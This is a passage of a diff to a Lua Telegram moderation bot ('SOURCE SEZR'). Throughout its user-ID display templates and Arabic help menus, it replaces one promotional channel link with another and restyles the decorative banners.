 -  ɢᴀᴍᴇ ➣ #game .
-- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ⚕𝙐𝙎𝙀𝙍??𝘼𝙈𝙀 : #username
@@ -16497,7 +16502,7 @@ Msᴀɢ ~ #msgs
 ⚕𝙄𝘿 : #id
 ⚕??𝙀𝙒𝙀𝙇𝙎 : #game
 ⚕𝘿𝙀𝙑 : #ridha
-⚕𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+⚕𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 • 🦄 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
@@ -16505,7 +16510,7 @@ Msᴀɢ ~ #msgs
 • 🦄 | 𝑰𝑫 : #id ‌‌‏♕
 • 🦄 | 𝑴𝑺𝑮 : #msgs 𓆊
 • 🦄 | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 : ⁞
-• 🦄 | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+• 🦄 | 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 • △ | 𝑼𝑬𝑺 : #username ‌‌‏⚚
@@ -16513,7 +16518,7 @@ Msᴀɢ ~ #msgs
 • ⊠ | 𝑰𝑫 : #id ‌‌‏♕
 • ❏ | 𝑴𝑺𝑮 : #msgs 𓆊
 • ❏ | 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 :
-• ❏ | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+• ❏ | 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ┇iD ➺ #id 💘
@@ -16521,21 +16526,21 @@ Msᴀɢ ~ #msgs
 ┇MsG ➺ #msgs 🧸 
 ┇StAtE ➺ #stast 🎀
 ┇EdIT ➺ #edit  💒
-┇𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+┇𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 • 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
 • 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
 • 🖤 | 𝑰𝑫 : #id ‌‌‏♕
 • 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
-• 🖤 | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+• 🖤 | 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𓄼 ᴜѕᴇ : #username ♕
 𓄼 ѕᴛᴀ : #stast ☥
 𓄼 ɪᴅ : #id ‌‌‏⚚
 𓄼 ᴍѕɢ : #msgs 𓆊
-𓄼 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𓄼 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ‎⿻┊Yor iD 𖠄 #id ٫
@@ -16543,7 +16548,7 @@ Msᴀɢ ~ #msgs
 ‌‎⿻┊MsGs 𖠄 #msgs ٫
 ‌‎⿻┊StAtS 𖠄 #stast ٫
 ‌‎⿻┊‌‎EdiT 𖠄 #edit ٫
-‌‎⿻┊‌‎𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+‌‎⿻┊‌‎𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 • ﮼ايديك  #id 🌻 ٬
@@ -16551,7 +16556,7 @@ Msᴀɢ ~ #msgs
 • ﮼مسجاتك ➺ #msgs 🌻 ٬
 •  ﮼رتبتك➺ #stast 🌻 ٬
 • ﮼تعديلك ➺ #edit 🌻 ٬
-•  تعين ➺ ↝https://t.me/surccesezr↜ 🌕 
+•  تعين ➺ ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ┄─━━ 🌕 ━━─┄
@@ -16562,7 +16567,7 @@ Msᴀɢ ~ #msgs
 𖥣 ᴇᴅɪᴛ 𓄹𓄼 #game🙇🏿‍♀💕
 ✰ ᴄʜ ᴇʟɪɴ ➣ #edit
 ┄─━━ 🌕 ━━─┄
-✰ 𝗖?? - ↝https://t.me/surccesezr↜ 🌕 
+✰ 𝗖?? - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
  🌕 | 𝐢𝐝  𓃠 #id .
@@ -16570,7 +16575,7 @@ Msᴀɢ ~ #msgs
  🌕 | 𝐦𝐬𝐠 𓃠 #msgs .
  🌕 | 𝐬𝐭𝐚 𓃠 #stast .
  🌕 | 𝒆??𝒊𝒕 𓃠 #edit .
- 🌕 | 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+ 🌕 | 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ♡ : 𝐼𝐷 𖠀 #id .
@@ -16578,49 +16583,49 @@ Msᴀɢ ~ #msgs
 ♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
 ♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
 ♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
-♡ : 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+♡ : 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 •ᑌᔕᗴᖇ- #username 
 •ᔕTᗩ- #stast 
 •ᗰᔕ- #msgs 
 •Iᗪ- #id
-•𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+•𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 • USE ➤ #username  .
 • MSG ➤  #msgs  .
 • STA ➤  #stast  .
 • iD ➤ #id  .
-• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𝐘??𝐮𝐫 𝐈𝐃 ☤🇪🇬- #id 
 𝐔𝐬𝐞𝐫𝐍𝐚☤🇪🇬- #username 
 𝐒𝐭𝐚𝐬𝐓 ☤🇪🇬- #stast 
 𝐌𝐬𝐠𝐒☤🇪🇬 - #msgs
-𝗖𝗛☤🇪🇬 - ↝https://t.me/surccesezr↜ 🌕 
+𝗖𝗛☤🇪🇬 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ⭐️𝖘𝖙𝖆 : #stast ـ🍭
 ⭐️𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : #username ـ🍭
 ⭐️𝖒𝖘𝖌𝖘 : #msgs ـ🍭
 ⭐️??𝖉 : #id ـ 🍭
-⭐️𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+⭐️𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 • 🇪🇬 - 𝚄𝚂𝙴𝚁 « #username  🍭
 • 🇪🇬 - 𝙸𝙳 « #id  🍭
 • 🇪🇬 - 𝙼𝚂𝙶?? « #msgs  🍭
 • 🇪🇬 - 𝚂𝚃𝙰𝚂𝚃 « #stast  🍭
-• 🇪🇬 - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+• 🇪🇬 - 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 • USE ➤  #username .
 • MSG ➤  #msgs .
 • STA ➤  #stast .
 • iD ➤ #id .
-• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
@@ -16628,14 +16633,14 @@ Msᴀɢ ~ #msgs
 🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
 🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
 🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
-🇪🇬 - 𝄬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+🇪🇬 - 𝄬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ➜𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : #username
 ➜𝗠𝗘𝗦𝗦??𝗚𝗘𝗦 : #msgs
 ➜𝗦𝗧𝗔𝗧𝗦 : #stast
 ➜𝗜𝗗 : #id
-➜𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+➜𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 - 🇪🇬 UsErNaMe . #username 𖠲
@@ -16643,21 +16648,21 @@ Msᴀɢ ~ #msgs
 - 🇪🇬 Id . #id 𖠲
 - 🇪🇬 GaMeS . #game 𖠲
 - 🇪🇬 MsGs . #msgs 𖠲
-- 🇪🇬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+- 🇪🇬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ⌔┇Msgs : #msgs.
 ⌔┇ID : #id.
 ⌔┇Stast : #stast.
 ⌔┇UserName : #username.
-⌔┇𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+⌔┇𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𝒔𝒕𝒂𓂅 #stast 𓍯
 𝐮𝐬𝐞𝐫𓂅 #username 𓍯
 𝒎????𝒆𓂅 #msgs 𓍯
 𝐢𝐝 𓂅 #id 𓍯
-𓂅 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𓂅 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𓄼🇪🇬 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
@@ -16665,21 +16670,21 @@ Msᴀɢ ~ #msgs
 𓄼🇪🇬 𝐢𝐝 : #id ‌‌‏⚚
 𓄼🇪🇬 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
 𓄼🇪🇬 𝑴𝒔𝒈𝒔 : #msgs 𓆊
-𓄼🇪🇬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𓄼🇪🇬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 Usᴇʀ Nᴀᴍᴇ ~ #username 
 Yᴏᴜʀ ɪᴅ ~ #id 
 Sᴛᴀsᴛ ~ #stast 
 Msᴀɢ ~ #msgs
-𝗖?? - ↝https://t.me/surccesezr↜ 🌕 
+𝗖?? - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ➥• USE 𖦹 #username - 🇪??.
 ➥• MSG 𖥳 #msgs  - 🇪🇬.
 ➥• STA 𖦹 #stast - 🇪??.
 ➥• iD 𖥳 #id - 🇪🇬.
-➥• 𝗖?? - ↝https://t.me/surccesezr↜ 🌕 
+➥• 𝗖?? - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 🇪🇬 - 𝄬 username . #username  ??
@@ -16687,7 +16692,7 @@ Msᴀɢ ~ #msgs
 🇪🇬 - 𝄬 id . #id ??
 🇪🇬 - 𝄬 gmas . #gmas 𓃠
 🇪🇬 - 𝄬 msgs . #msgs  𓃠
-🇪🇬 - 𝄬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+🇪🇬 - 𝄬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 .𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  🖤 ↴
@@ -16695,7 +16700,7 @@ Msᴀɢ ~ #msgs
 .𖣂 𝙡𝘿 , #id  🖤 ↴
 .𖣂 𝘼𝙪𝙩𝙤 , #auto  🖤 ↴
 .𖣂 𝙢𝙨𝙂𝙨 , #msgs  🖤 ↴
-.𖣂 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+.𖣂 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 金 - 𝓾𝓼𝓮𝓻??𝓪𝓶𝓮 . #username ⸙ 
@@ -16703,7 +16708,7 @@ Msᴀɢ ~ #msgs
 金 - 𝓲𝓭 . #id ⸙ 
 金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
 金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
-金 - 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+金 - 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 - 🇪🇬 𝐮𝐬𝐞𝐫𝒏𝒂𝒎𝒆 . #username 𖣂.
@@ -16711,7 +16716,7 @@ Msᴀɢ ~ #msgs
 - 🇪🇬 𝐢?? . #id 𖣂.
 - 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
 - 🇪🇬 𝐦𝐬𝐠 . #msgs 𖣂.
-- 🇪🇬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+- 🇪🇬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮??𝗘 . #username 🇪🇬 ꙰
@@ -16719,7 +16724,7 @@ Msᴀɢ ~ #msgs
 ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
 ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
 ᯓ 𝗺𝗦𝗚?? . #msgs ??🇬 ꙰
-ᯓ 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+ᯓ 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
@@ -16727,14 +16732,14 @@ Msᴀɢ ~ #msgs
 👳??‍♂ - 𝄬 id . #id . 🇪🇬
 👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
 👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
-👳🏼‍♂ - 𝄬 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+👳🏼‍♂ - 𝄬 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
 ➮- 𝐮𝐬𝐞𝐫𓂅 #username 𓍯. 💕
 ➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
 ➭- 𝐢𝐝 𓂅 #id 𓍯. 💕
-➭- 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+➭- 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𓄼 ᴜѕᴇ : #username ♕
@@ -16742,7 +16747,7 @@ Msᴀɢ ~ #msgs
 𓄼 ɪᴅ : #id ‌‌‏⚚
 𓄼 ᴍѕɢ : #msgs 𓆊 
 𓐀 𝑾𝒆𝒍𝒄𝒐𝒎?? 𓀃.
-𓄼 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𓄼 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
@@ -16751,14 +16756,14 @@ Msᴀɢ ~ #msgs
 𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
 𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
 𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
-𝐓𝐓• 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𝐓𝐓• 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
-↑𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username 🌕  
-↑𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘𝙄𝘿 ➱ #id
-↑𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘𝙍𝘼𝙉𝙆 ➱  #stast 🌕  
-↑𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘??𝘼??𝙂 ➱ #msgs 🌕  
-↑𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘𝗖𝗛 ➯  ↝https://t.me/surccesezr↜ 🌕  
+↑⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username 🌕  
+↑⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺𝙄𝘿 ➱ #id
+↑⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺𝙍𝘼𝙉𝙆 ➱  #stast 🌕  
+↑⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺??𝘼𝙎𝙂 ➱ #msgs 🌕  
+↑⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺𝗖𝗛 ➯  ↝@A_F_fwdka1↜ 🌕  
 ]],
 [[
 𝟓 𝟔 𖡻 #username  ࿇🦄
@@ -16766,28 +16771,28 @@ Msᴀɢ ~ #msgs
 𝟓 𝟔 𖡻 #auto  ࿇🦄
 𝟓 𝟔 𖡻 #stast  ࿇🦄
 𝟓 𝟔 𖡻 #id  ࿇🦄
-𝟓 𝟔 𖡻 𝗖𝗛 - ↝https://t.me/surccesezr↜ 🌕 
+𝟓 𝟔 𖡻 𝗖𝗛 - ↝@A_F_fwdka1↜ 🌕 
 ]],
 [[
 ► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
 ► 𝗜𝗗 #id ?? ꙰
 ► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
 ► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
-► 𝗶𝗗 - ↝https://t.me/surccesezr↜ ☆
+► 𝗶𝗗 - ↝@A_F_fwdka1↜ ☆
 ]],
 [[
 - UsEr🇺🇸 ꙰ #username
 - StA🇺🇸 ꙰   #msgs
 - MsGs🇺🇸 ꙰ #stast
 - ID🇺🇸 ꙰  #id
-- 𝗶𝗗 🇺🇸 ꙰  ↝https://t.me/surccesezr↜ ☆
+- 𝗶𝗗 🇺🇸 ꙰  ↝@A_F_fwdka1↜ ☆
 ]],
 [[
 |• 𝚄𝚂𝙴𝚁  ⇉⁞ #username ↝🇵🇷.
 |• 𝙼𝚂𝙶𝚂 ⇉ ⁞  #msgs  ↝ 🇵🇷.
 |• 𝚁𝙰𝙽𝙺  ⇉⁞ #stast  ↝🇵🇷.
 |• 𝙸𝙳 𝚂𝚃𝙰 ⇉ #id  ↝🇵🇷.
-|• 𝗶𝗗 - ↝https://t.me/surccesezr↜ ☆
+|• 𝗶𝗗 - ↝@A_F_fwdka1↜ ☆
 ]],
 [[
 - 🦋 UsErNaMe . #username 𖠲
@@ -16795,7 +16800,7 @@ Msᴀɢ ~ #msgs
 - 🦋 Id . #id 𖠲
 - 🦋 GaMeS . #game 𖠲
 - 🦋 MsGs . #msgs 𖠲
-- 🦋 𝗖𝗛 - ↝https://t.me/surccesezr↜ ☆
+- 🦋 𝗖𝗛 - ↝@A_F_fwdka1↜ ☆
 ]]}
 local Text_Rand = List[math.random(#List)]
 database:set(bot_id.."KLISH:ID"..msg.chat_id_,Text_Rand)
@@ -17071,7 +17076,7 @@ if Json_Info.result.can_restrict_members == true then
 restrict = '✔️' else restrict = '✖' end
 if Json_Info.result.can_promote_members == true then
 promote = '✔️' else promote = '✖' end 
-send(msg.chat_id_,msg.id_,'\n 🌕 اهلا عزيزي البوت هنا ادمن'..'\n 🌕 وصلاحياته هي 𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n━━━━━━━━━━'..'\n 🌕 تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n 🌕 مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n 🌕 حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n 🌕 دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n 🌕 تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n 🌕 اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
+send(msg.chat_id_,msg.id_,'\n 🌕 اهلا عزيزي البوت هنا ادمن'..'\n 🌕 وصلاحياته هي ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ \n━━━━━━━━━━'..'\n 🌕 تغير معلومات الجروب ↞ ❴ '..info..' ❵'..'\n 🌕 مسح الرسائل ↞ ❴ '..delete..' ❵'..'\n 🌕 حظر المستخدمين ↞ ❴ '..restrict..' ❵'..'\n 🌕 دعوة مستخدمين ↞ ❴ '..invite..' ❵'..'\n 🌕 تثبيت الرسائل ↞ ❴ '..pin..' ❵'..'\n 🌕 اضافة مشرفين جدد ↞ ❴ '..promote..' ❵')   
 end
 end
 end
@@ -17303,9 +17308,9 @@ return false
 end
 local Text =[[
 اهلا بك في اوامر المجموعه.🚦
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
 اختر الامر الذي تريده بـ الأسفل ⇊
-[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/surccesezr)
+[𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/A_F_fwdka1)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17336,7 +17341,7 @@ local Text = [[
 [🕹اضغط علي الأزرار في الأسفل  ⇈⇊]
 [🎯ألعاب سورس السيزر الاحسن في التليجرام ⇈⇊]
 ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
- [𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/surccesezr)
+ [𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑](t.me/A_F_fwdka1)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -17350,7 +17355,7 @@ keyboard.inline_keyboard = {
 {text = '◗الاوامر◖', callback_data="/help12"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"},
+{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -17359,7 +17364,7 @@ end
 if text == 'امر الـعـضو ' or text == 'اوامر الأعضاء' or text == 'اوامر الاعضاء' then
 local Text = [[
  اتبع الاوامر الاعضاء
- تحت لي في الزر الأسفل𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+ تحت لي في الزر الأسفل⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  
  ..
 ]]
@@ -17369,7 +17374,7 @@ keyboard.inline_keyboard = {
 {text = 'اوامر الاعضاء', callback_data="/change-names"},
 },
 {
-{text = '˹𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑˼', url="t.me/surccesezr"},
+{text = '˹𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑˼', url="t.me/A_F_fwdka1"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
@@ -17741,11 +17746,11 @@ return false
 end
 local Teext =[[
 اوامر حماية المجموعه ⇊
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
 قفل  ⇔  فتح + الامر 
 قفل  ⇔  فتح ❲ الكـــل ❳
 ❲ بالتقيد ، بالطرد ، بالكتم ❳
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 الروابط
  🌕 المعرف
  🌕 التاك
@@ -17773,7 +17778,7 @@ local Teext =[[
  🌕 الصوت
  🌕 الجهات
  🌕 الاشعارات
-𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
 
 ]]
 keyboard = {} 
@@ -17798,13 +17803,13 @@ local Teext =[[
  🌕 الادمن ⇔ المنشئ ⇔ المالك
  ⩹━━━━⊶❲𖥳 𝐒𝐀𝐈𝐃𝐈 ??❳⊷━━━━⩺
  🌕 ❲ المميز❳ ⇊
- 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 كشف
  🌕 المحظورين
  🌕 المكتومين
- 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 ❲ الادمن❳ ⇊
- 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 رفع مميز ⇔ تنزيل مميز
  🌕 الترحيب
  🌕 اضف مغادره ⇔ مسح المغادره
@@ -17819,9 +17824,9 @@ local Teext =[[
  🌕 تثبيت ⇔ تثبيت بدون اشعار
  🌕 الغاء تثبيت الكل
  🌕  ❲ + ❳ جميع ماسبق
- 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 ❲ المنشئ❳ ⇊
- 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕  رفع ⇔ تنزيل ادمن
  🌕 اضف ⇔  مسح  ❲ رد ❳
  🌕 الردود ⇔  مسح الردود
@@ -17835,9 +17840,9 @@ local Teext =[[
  🌕  مسح الكلمات الممنوعه
  🌕 المميزين عام
  🌕  ❲ + ❳ جميع ماسبق
- 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 ❲ المالك❳ ⇊
- 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
  🌕 اضف صوره ⇔ وصف (للجروب)
  🌕 رفع منشئ ⇔ تنزيل منشئ
  🌕 تاج للاعضاء ⇔ للكل
@@ -17848,7 +17853,7 @@ local Teext =[[
  🌕 ضع اسم+الاسم ⇔ تحديث
  🌕 المنشئين ⇔  مسح المنشئين
  🌕  ❲ + ❳ جميع ماسبق
- 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘
+ ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺
 
 ]]
 keyboard = {} 
@@ -17873,7 +17878,7 @@ local Teext =[[
  ↯ مرحب بيك في اوامر للمطورين ↯
 اوامر المطورين ⇊
 ❲المطرو❳  ⇊
